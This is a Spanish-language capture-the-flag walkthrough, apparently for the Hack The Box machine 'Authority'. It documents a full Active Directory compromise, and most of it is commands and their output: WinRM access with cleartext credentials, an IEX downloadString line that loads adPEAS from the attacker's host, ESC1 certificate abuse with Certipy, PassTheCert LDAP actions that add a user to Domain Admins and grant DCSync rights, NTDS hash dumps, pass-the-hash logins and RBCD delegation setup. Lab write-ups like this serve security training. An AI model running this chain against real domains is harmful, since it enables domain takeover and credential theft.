<figure><img src="../../.gitbook/assets/5218_vmware_BlHzr3m05W.png" alt=""><figcaption></figcaption></figure>

### Abusing WinRM - EvilWinRM

Verificamos que las credenciales obtenidas del usuario `svc_ldap` son válidas y también que nos podemos conectar remotamente al Domain Controller.

Al acceder a través de `evil-winrm` al DC, hemos logrado acceder y obtener la flag **root.txt**.

```bash
❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
❯ nxc winrm 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
❯ evil-winrm -i 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> type ../Desktop/user.txt
8af7e606************************
```

## Privilege Escalation&#x20;

### DC Enumeration (adPEAS) - Powershell tool to automate Active Directory enumeration

Debido que nos encontramos en un Domain Controller, haremos una enumeración a través de `adPEAS` que es una herramienta automatizada para realizar un escaneo en Active Directory en busca de encontrar alguna de escalar privilegios.

Para ello nos descargaremos en nuestro equipo el `adPEAS` y lo compartiremos a través de un servidor web.

```bash
❯ wget https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
--2025-02-22 05:05:44--  https://raw.githubusercontent.com/61106960/adPEAS/refs/heads/main/adPEAS.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3493853 (3,3M) [text/plain]
Grabando a: «adPEAS.ps1»

adPEAS.ps1                                                100%[===================================================================================================================================>]   3,33M  3,54MB/s    en 0,9s    

2025-02-22 05:05:46 (3,54 MB/s) - «adPEAS.ps1» guardado [3493853/3493853]

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde el Domain Controller, importaremos en memoria el `adPEAS` y lo invocaremos para realizar el análisis.

```powershell
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> IEX(New-Object Net.WebClient).downloadString("http://10.10.16.3/adPEAS.ps1")
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> Invoke-adPEAS
```

En la enumeración con `adPEAS`, identificamos que la máquina tiene `Active Directory Certificate Services (ADCS)` habilitado, específicamente con la CA `AUTHORITY-CA`, que está corriendo en `authority.authority.htb` (IP `10.10.11.222`).

Al revisar los **templates disponibles**, encontramos varios, entre ellos:

* **CorpVPN**
* **AuthorityLDAPS**
* **DomainControllerAuthentication**
* **KerberosAuthentication**
* **User**
* **Administrator**
* Y otros más...

Lo interesante es que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que indica que permite definir el Subject cuando se solicita un certificado. Además, el grupo **HTB\Domain Computers** tiene permisos de inscripción sobre este template.

```powershell
[?] +++++ Searching for Active Directory Certificate Services Information +++++
[+] Found at least one available Active Directory Certificate Service
adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2

[+] Found Active Directory Certificate Services 'AUTHORITY-CA':
CA Name:				AUTHORITY-CA
CA dnshostname:				authority.authority.htb
CA IP Address:				10.10.11.222
Date of Creation:			04/24/2023 01:56:26
DistinguishedName:			CN=AUTHORITY-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
NTAuthCertificates:			True
Available Templates:			CorpVPN
					AuthorityLDAPS
					DirectoryEmailReplication
					DomainControllerAuthentication
					KerberosAuthentication
					EFSRecovery
					EFS
					DomainController
					WebServer
					Machine
					User
					SubCA
					Administrator

[?] +++++ Searching for Vulnerable Certificate Templates +++++
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'CorpVPN' +++++
[!] Template 'CorpVPN' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
Template Name:				CorpVPN
Template distinguishedname:		CN=CorpVPN,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=authority,DC=htb
Date of Creation:			03/24/2023 23:48:09
[+] Extended Key Usage:			Encrypting File System, Secure E-mail, Client Authentication, Document Signing, 1.3.6.1.5.5.8.2.2, IP Security User, KDC Authentication
EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT_CHECK_USER_DS_CERTIFICATE
[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
[+] Enrollment allowed for:		HTB\Domain Computers
```

### Abusing Active Directory Certificate Services (ADCS)

Confirmamos la existencia de `ESC1 (Enrollment Services Configuration #1)` en el servicio `Active Directory Certificate Services (ADCS)` de la CA `AUTHORITY-CA`.

Usando `Certipy`, identificamos que el template `CorpVPN` tiene configurado el flag `ENROLLEE_SUPPLIES_SUBJECT` y permite autenticación de cliente (`Client Authentication`). Además, el grupo `HTB\Domain Computers` tiene permisos de inscripción sobre este template.

```bash
❯ certipy-ad find -u 'svc_ldap'@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'AUTHORITY-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : AUTHORITY.HTB\Administrators
      Access Rights
        ManageCertificates              : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        ManageCa                        : AUTHORITY.HTB\Administrators
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
        Enroll                          : AUTHORITY.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

### ESC1 exploitation case (Machine Account) with certipy-ad

Intentamos explotar `ESC1`, pero el usuario `svc_ldap` no tiene permisos de inscripción (`enrollment`) en el template `CorpVPN`. Solo las cuentas dentro del grupo `HTB\Domain Computers` pueden inscribirse y solicitar certificados con este template.

Si podemos comprometer un equipo con una cuenta de máquina (`AUTHORITY.HTB\PC$`), podríamos usarla para inscribir un certificado y luego abusar de él.

```bash
❯ certipy-ad req -u 'svc_ldap'@10.10.11.222 -p 'lDaP_1n_th3_cle4r!' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -dc-ip 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 2
Would you like to save the private key? (y/N) 
```

Confirmamos con `adPEAS` que el template `CorpVPN` tiene el flag `ENROLLEE_SUPPLIES_SUBJECT`, lo que permite al solicitante definir el Subject Alternative Name (SAN). Sin embargo, también verificamos que **solo las cuentas dentro del grupo `HTB\Domain Computers` tienen permisos de inscripción (`enrollment`)**.

```powershell
[?] +++++ Checking Template 'CorpVPN' +++++
[!] Template 'CorpVPN' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[+] Identity 'HTB\Domain Computers' has enrollment rights for template 'CorpVPN'
```

En el resultado de `adPEAS`, observamos que el `MachineAccountQuota` está configurado en **10**, lo que significa que cualquier usuario autenticado puede agregar hasta 10 equipos al dominio.

Dado que previamente identificamos que **solo los Domain Computers tienen permisos de enrollment** en el template vulnerable, podemos aprovechar esta configuración para **crear una cuenta de máquina controlada por nosotros** y así explotar `ESC1`.

```powershell
[?] +++++ Checking Add-Computer Permissions +++++
[+] Filtering found identities that can add a computer object to domain 'authority.htb':
[!] The Machine Account Quota is currently set to 10
[!] Every member of group 'Authenticated Users' can add a computer to domain 'authority.htb'

distinguishedName:			CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=authority,DC=htb
objectSid:				S-1-5-11
memberOf:				CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=authority,DC=htb
					CN=Certificate Service DCOM Access,CN=Builtin,DC=authority,DC=htb
					CN=Users,CN=Builtin,DC=authority,DC=htb
```

A continuación, realizaremos el `ESC1` enfocado a las `Machine Account` que son las que disponen de permisos de `enrollment` para realizar la explotación.

Para ello, el objetivo será crear un nuevo `Computer` para poder realizar el `ESC1` con las credenciales de la cuenta de equipo del PC que creemos. A través de la herramienta de `PowerView.py` nos conectaremos mediante LDAP y crearemos un nuevo `Computer` llamado `Gzzcoo` con credenciales `Gzzcoo123`.

{% embed url="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc1#esc1-linux-machine-account" %}

```bash
❯ powerview authority.htb/'svc_ldap':'lDaP_1n_th3_cle4r!'@10.10.11.222 --dc-ip 10.10.11.222
Logging directory is set to /home/kali/.powerview/logs/authority-svc_ldap-10.10.11.222
[2025-02-22 05:13:25] [Storage] Using cache directory: /home/kali/.powerview/storage/ldap_cache
[2025-02-22 05:13:25] User svc_ldap has adminCount attribute set to 1. Might be admin somewhere somehow :)
(LDAPS)-[authority.authority.htb]-[HTB\svc_ldap]
PV > Add-ADComputer
[2025-02-22 05:13:32] -ComputerName and -ComputerPass are required
(LDAPS)-[authority.authority.htb]-[HTB\svc_ldap]
PV > Add-ADComputer -ComputerName Gzzcoo -ComputerPass Gzzcoo123
[2025-02-22 05:13:49] Successfully added machine account Gzzcoo$ with password Gzzcoo123.
```

Una vez tengamos el `Computer` creado, verificaremos desde `PowerView.py` de que el objeto se ha creado correctamente en el Active Directory.

```powershell
PV > Add-ADComGet-ADObject -Identity Gzzcoo$
objectClass                : top
                             person
                             organizationalPerson
                             user
                             computer
cn                         : Gzzcoo
distinguishedName          : CN=Gzzcoo,CN=Computers,DC=authority,DC=htb
instanceType               : 4
whenCreated                : 22/02/2025 06:52:39 (today)
whenChanged                : 22/02/2025 06:52:39 (today)
uSNCreated                 : 262368
uSNChanged                 : 262370
name                       : Gzzcoo
objectGUID                 : {beb65f20-e494-4c46-90b0-bfc2cbd3ea15}
userAccountControl         : WORKSTATION_TRUST_ACCOUNT [4096]
badPwdCount                : 0
codePage                   : 0
countryCode                : 0
badPasswordTime            : 01/01/1601 00:00:00 (424 years, 1 month ago)
lastLogoff                 : 1601-01-01 00:00:00+00:00
lastLogon                  : 01/01/1601 00:00:00 (424 years, 1 month ago)
localPolicyFlags           : 0
pwdLastSet                 : 22/02/2025 06:52:39 (today)
primaryGroupID             : 515
objectSid                  : S-1-5-21-622327497-3269355298-2248959698-11601
accountExpires             : 9999-12-31 23:59:59.999999+00:00
logonCount                 : 0
sAMAccountName             : Gzzcooo$
sAMAccountType             : SAM_MACHINE_ACCOUNT
dNSHostName                : Gzzcoo.authority.htb
servicePrincipalName       : RestrictedKrbHost/Gzzcoo.authority.htb
                             RestrictedKrbHost/Gzzcoo
                             HOST/Gzzcoo.authority.htb
                             HOST/Gzzcoo
objectCategory             : CN=Computer,CN=Schema,CN=Configuration,DC=authority,DC=htb
isCriticalSystemObject     : False
dSCorePropagationData      : 01/01/1601
mS-DS-CreatorSID           : S-1-5-21-622327497-3269355298-2248959698-1601
```

Una vez que hemos creado una cuenta de equipo, procedemos a realizar el `ESC1` utilizando sus credenciales. La solicitud de certificado se completa con éxito, obteniendo un certificado con el UPN `administrator@authority.htb`, lo que nos permite autenticarnos como este usuario y escalar privilegios en el dominio.

```bash
❯ certipy-ad req -u 'Gzzcooo$'@10.10.11.222 -p 'Gzzcoo123' -ca AUTHORITY-CA -template CorpVPN -upn administrator@authority.htb -target 10.10.11.222
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 4
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Al intentar autenticarnos con el certificado `PFX`, obtenemos un error `KDC_ERR_PADATA_TYPE_NOSUPP`, lo que indica que el KDC no admite el tipo de autenticación proporcionado. Más adelante, exploraremos otras formas de autenticarnos con este certificado para intentar acceder con éxito al dominio.

```bash
❯ certipy-ad auth -pfx administrator.pfx -username Administrator -domain authority.htb
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@authority.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
```

### Authenticating with certificates when PKINIT is not supported (PassTheCert.py)

Nos encontramos con varios blogs que mencionan el error `KDC_ERR_PADATA_TYPE_NOSUPP`, el cual ocurre cuando el **controlador de dominio no soporta PKINIT**. Esto impide que autenticarnos directamente con el certificado PFX.

Como alternativa, podemos utilizar `PassTheCert` para autenticarnos a `LDAP a través de SChannel` con nuestro certificado. Aunque esto solo nos daría acceso a LDAP, podría ser suficiente si el certificado nos identifica como `Administrador de Dominio`.

{% embed url="https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html" %}

{% embed url="https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d" %}

{% hint style="info" %}
KDC\_ERR\_PADATA\_TYPE\_NOSUPP

“…when a domain controller doesn’t have a certificate installed for smart cards…” is probably the most common reason for KDC\_ERR\_PADATA\_TYPE\_NOSUPP. If the DC doesn’t have a “Domain Controller”, “Domain Controller Authentication”, or another certificate with the Server Authentication EKU (OID 1.3.6.1.5.5.7.3.1) installed, the DC isn’t properly set up for PKINIT and authentication will fail.

Also, according to Microsoft, “This problem can happen because the wrong certification authority (CA) is being queried or the proper CA cannot be contacted in order to get Domain Controller or Domain Controller Authentication certificates for the domain controller.” At least in some cases we’ve been able to auth via PKINIT to a DC even when the CA is not reachable, so this situation may be hit and miss.

If you run into a situation where you can enroll in a vulnerable certificate template but the resulting certificate fails for Kerberos authentication, you can try authenticating to LDAP via SChannel using something like PassTheCert. You will only have LDAP access, but this should be enough if you have a certificate stating you’re a domain admin.
{% endhint %}

Lo primero que haremos será extraer la **clave privada** y el **certificado** desde el archivo PFX que obtuvimos del usuario `Administrator`. Para ello, utilizamos `Certipy` de la siguiente manera. A continuación, haremos uso de la herramienta `PassTheCert.py` para autentifcarnos con el certificado obtenido.

{% embed url="https://github.com/AlmondOffSec/PassTheCert" %}

```bash
❯ certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'administrator.crt'

❯ certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'administrator.key'
```

Con **PassTheCert**, utilizamos la clave privada y el certificado generado anteriormente para autenticarnos. El resultado confirma que estamos autenticados como **HTB\Administrator**, lo que significa que podemos conectarnos vía **LDAP SChannel** y realizar otras acciones para intentar **escalar privilegios** y obtener acceso completo al sistema.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action whoami -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] You are logged in as: HTB\Administrator
```

### Nº1 PrivEsc - Adding user to Domain Admins group trough PassTheCert Authentication

El primer método que probamos fue utilizar `PassTheCert` para conectarnos a una **shell de LDAP** que ofrece la herramienta. Desde ahí, usamos el comando `add_user_to_group` para añadir el usuario no privilegiado que teníamos previamente al grupo `Domain Admins`.

El resultado confirma que el usuario **`svc_ldap`** fue agregado con éxito al grupo **`Domain Admins`**, lo que nos otorga privilegios elevados en el dominio.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action ldap-shell -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands

# help

 add_computer computer [password] [nospns] - Adds a new computer to the domain with the specified password. If nospns is specified, computer will be created with only a single necessary HOST SPN. Requires LDAPS.
 rename_computer current_name new_name - Sets the SAMAccountName attribute on a computer object to a new value.
 add_user new_user [parent] - Creates a new user.
 add_user_to_group user group - Adds a user to a group.
 change_password user [password] - Attempt to change a given user's password. Requires LDAPS.
 clear_rbcd target - Clear the resource based constrained delegation configuration information.
 disable_account user - Disable the user's account.
 enable_account user - Enable the user's account.
 dump - Dumps the domain.
 search query [attributes,] - Search users and groups by name, distinguishedName and sAMAccountName.
 get_user_groups user - Retrieves all groups this user is a member of.
 get_group_users group - Retrieves all members of a group.
 get_laps_password computer - Retrieves the LAPS passwords associated with a given computer (sAMAccountName).
 grant_control target grantee - Grant full control of a given target object (sAMAccountName) to the grantee (sAMAccountName).
 set_dontreqpreauth user true/false - Set the don't require pre-authentication flag to true or false.
 set_rbcd target grantee - Grant the grantee (sAMAccountName) the ability to perform RBCD to the target (sAMAccountName).
 start_tls - Send a StartTLS command to upgrade from LDAP to LDAPS. Use this to bypass channel binding for operations necessitating an encrypted channel.
 write_gpo_dacl user gpoSID - Write a full control ACE to the gpo for the given user. The gpoSID must be entered surrounding by {}.
 whoami - get connected user
 dirsync - Dirsync requested attributes
 exit - Terminates this session.

# add_user_to_group svc_ldap "Domain Admins"
Adding user: svc_ldap to group Domain Admins result: OK
```

Conectados al **`DC`** con el usuario **`svc_ldap`** a través de **WinRM** (ya que verificamos previamente que tenía permisos para hacerlo), revisamos los miembros del grupo **Domain Admins** y confirmamos que ahora formamos parte de él.

Aunque ya tenemos privilegios de **Domain Admin**, nuestro objetivo final es **convertirnos en el usuario `Administrator`**. Para ello, exploraremos otros ataques que nos permitan obtener acceso directo a esta cuenta.

```bash
*Evil-WinRM* PS C:\Users\svc_ldap\Documents> net group "Domain Admins"
Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
Administrator            svc_ldap
The command completed successfully.
```

Como ahora formamos parte de **`Domain Admins`**, tenemos permisos para realizar un ataque **`DCSync`**, lo que nos permite extraer los hashes de las credenciales del dominio mediante `secretsdump.py`.

Aquí obtenemos el **NT hash** del usuario **`Administrator`**, lo que nos permitirá realizar un `Pass-The-Hash` y acceder directamente con su cuenta.

```bash
❯ secretsdump.py authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 -dc-ip 10.10.11.222 -just-dc-ntlm
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:addf932778c269fb8c1a60e722569258:::
[*] Cleaning up... 
```

Verificamos que el NT hash obtenido es válido realizando un Pass-The-Hash (PTH) con **nxc**, lo que nos confirma que la autenticación con el hash NTLM del usuario **Administrator** es correcta. Luego, utilizamos **Evil-WinRM** para acceder al **DC** con privilegios de administrador y, finalmente, verificamos el contenido de la flag **root.txt**.

```bash
❯ nxc smb 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed'
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\Administrator:6961f422924da90a6928197429eea4ed (Pwn3d!)
❯ evil-winrm -i 10.10.11.222 -u 'Administrator' -H '6961f422924da90a6928197429eea4ed'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
ecfaa***************************
```

### Nº2 PrivEsc - Assigning DCSync permissions to a user through PassTheCert Authentication

Otro método que encontramos es asignar permisos de **`DCSync`** a un usuario sin necesidad de añadirlo directamente al grupo **`Domain Admins`**, lo cual puede ser una acción más evidente. Utilizamos **`PassTheCert`** para otorgar estos permisos al usuario **`svc_ldap`**, lo que nos permite realizar un **`secretsdump`** posteriormente para extraer hashes de contraseñas sin necesidad de ser parte del grupo de administradores.

Con este método, le otorgamos al usuario **`svc_ldap`** permisos para realizar un **`DCSync`** sin necesidad de comprometer directamente a **`Domain Admins`**, lo que lo hace menos detectable. Esto nos permitirá extraer hashes de contraseñas y realizar otras acciones de escalada de privilegios.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target svc_ldap -elevate
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Granted user 'svc_ldap' DCSYNC rights!
```

En este caso, usamos **`nxc`** para realizar el dump del archivo **`NTDS.dit`** desde el controlador de dominio. Este es otro método que aprovechamos para obtener los hashes de contraseñas del dominio. En este proceso, conseguimos hacer el dump de los hashes NTDS del controlador de dominio. Entre los resultados obtenidos, encontramos varios hashes relevantes, como los de los usuarios **`Administrator`**, **`Guest`**, **`krbtgt`**, y **`svc_ldap`**.&#x20;

Con esto, podríamos emplear la técnica de `PassTheHash` para autenticarnos como el usuario `Administrator` con su hash NTLM.

```bash
❯ nxc smb 10.10.11.222 -u 'svc_ldap' -p 'lDaP_1n_th3_cle4r!' --ntds
[!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user <user> to dump a specific user safely or the module -M ntdsutil [Y/n] Y
SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.222    445    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
SMB         10.10.11.222    445    AUTHORITY        [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
SMB         10.10.11.222    445    AUTHORITY        [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         10.10.11.222    445    AUTHORITY        Administrator:500:aad3b435b51404eeaad3b435b51404ee:6961f422924da90a6928197429eea4ed:::
SMB         10.10.11.222    445    AUTHORITY        Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.10.11.222    445    AUTHORITY        krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bd6bd7fcab60ba569e3ed57c7c322908:::
SMB         10.10.11.222    445    AUTHORITY        svc_ldap:1601:aad3b435b51404eeaad3b435b51404ee:6839f4ed6c7e142fed7988a6c5d0c5f1:::
SMB         10.10.11.222    445    AUTHORITY        AUTHORITY$:1000:aad3b435b51404eeaad3b435b51404ee:addf932778c269fb8c1a60e722569258:::
SMB         10.10.11.222    445    AUTHORITY        [+] Dumped 5 NTDS hashes to /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds of which 4 were added to the database
SMB         10.10.11.222    445    AUTHORITY        [*] To extract only enabled accounts from the output file, run the following command: 
SMB         10.10.11.222    445    AUTHORITY        [*] cat /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds | grep -iv disabled | cut -d ':' -f1
SMB         10.10.11.222    445    AUTHORITY        [*] grep -iv disabled /home/kali/.nxc/logs/AUTHORITY_10.10.11.222_2025-02-22_090440.ntds | cut -d ':' -f1
```

### Nº3 PrivEsc - Resource-based Constrained Delegation (RBCD Attack) trough PassTheCert Authentication

En este caso, implementamos un ataque **RBCD (Resource-based Constrained Delegation)** para escalar privilegios. A través de **PassTheCert**, comenzamos creando un nuevo equipo dentro del dominio, lo que nos permite posteriormente aprovechar las delegaciones restringidas de recursos. Para esto, usamos el siguiente comando para añadir un equipo al dominio y asignarle una contraseña:

Este comando añadió con éxito una cuenta de máquina llamada **rbcd\_gzzcoo$** al dominio **authority.htb**, lo cual es el primer paso en la explotación de la delegación de recursos. El siguiente paso sería configurar la delegación para que esta máquina pueda ser utilizada en el ataque RBCD, lo que nos permitiría acceder a los recursos del dominio o a los servicios delegados con mayores privilegios.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action add_computer -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -computer-name 'rbcd_gzzcoo$' -computer-pass 'Gzzcoo123'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account rbcd_gzzcoo$ with password Gzzcoo123.
```

El siguiente paso en la explotación de **`Resource-based Constrained Delegation (RBCD)`** consiste en configurar correctamente los permisos de delegación para que la máquina **`rbcd_gzzcoo$`** pueda actuar en nombre de los usuarios de la máquina **`AUTHORITY$`**.

Con este comando, hemos configurado **`rbcd_gzzcoo$`** para que pueda actuar en nombre de los usuarios en **`AUTHORITY$`** mediante el protocolo **`S4U2Proxy`**. Esto significa que ahora la máquina **`rbcd_gzzcoo$`** tiene permisos para suplantar identidades de los usuarios de **`AUTHORITY$`**, lo que nos proporciona un vector para escalar privilegios aún más.

Al permitir que **`rbcd_gzzcoo$`** actúe en nombre de **`AUTHORITY$`**, tenemos acceso a las credenciales y recursos protegidos por las políticas de delegación en la máquina **`AUTHORITY$`**. Esto abre la puerta a la obtención de privilegios elevados y al acceso a más recursos dentro del dominio.

```bash
❯ python3 /opt/PassTheCert/Python/passthecert.py -action write_rbcd -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -delegate-to 'AUTHORITY$' -delegate-from 'rbcd_gzzcoo$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] rbcd_gzzcoo$ can now impersonate users on AUTHORITY$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     rbcd_gzzcoo$   (S-1-5-21-622327497-3269355298-2248959698-11604)
```

